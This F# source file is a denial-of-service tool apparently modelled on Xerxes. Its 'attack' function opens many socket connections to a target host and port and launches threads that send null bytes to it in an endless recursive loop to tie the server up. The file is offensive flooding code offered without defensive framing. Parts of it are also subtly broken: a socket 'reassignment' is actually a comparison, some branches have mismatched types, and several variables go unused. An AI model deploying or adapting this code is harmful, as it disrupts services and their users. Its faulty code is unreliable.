#nowarn "20"

namespace sultan

open sultan
open sultan.printxlib

open socklib

open System
open System.IO
open System.Net
open System.Text
open System.Net.Sockets
open System.Collections.Generic

module xerxeslib =
    let nil : string = string (char 0x00)

    let rec sendnul (host : string) (port : int) (sockets : List<Socket>) (index : int) (number : int) =
        let request : byte array = Encoding.ASCII.GetBytes (nil)
        let socket = sockets.[index]
        let mutable newIndex = 0
        let mutable r = 0

        // The party starts right here
        try
            r <- socket.Send(request)
            None
        with
            | :? System.Net.Sockets.SocketException as err ->
                error ("The established socket [" + index.ToString() + "] was aborted by the host machine's software.")
                socket.Close()
                socket = socketutil.connect(host, port)
                None

        if r = -1 then
            socket.Close()
            socket = socketutil.connect(host, port)
            else false
        verbose ("volley [" + (Thread.CurrentThread.ManagedThreadId).ToString() + ">" + (number.ToString()) + "] sent")
        if (index + 1) >= sockets.Count then
            newIndex <- 0
            else newIndex <- (index + 1)

        sendnul host port sockets newIndex (number + 1)

    let startattackthread (host : string) (port : int) (sockets : List<Socket>) (threadno : int) =
        let param = struct(host, port, sockets, 0, 1)
        let cts = new ThreadStart((fun () -> sendnul host port sockets 0 1))
        let childthread : Thread = new Thread(cts)
        childthread.Start()
        success ("initialized thread " + threadno.ToString() + " -> " + (Thread.CurrentThread.ManagedThreadId).ToString())

    let attack (host : string) (port : int) (id : int) (connections : int) (threads : int) =
        let sockets : List<Socket>= new List<Socket>()
        for i = 0 to connections do
            sockets.Add(socketutil.connect(host, port))
        let g : int = 1
        let r : int = 0
        for x = 0 to threads do
            startattackthread host port sockets x
            Thread.Sleep(15000)

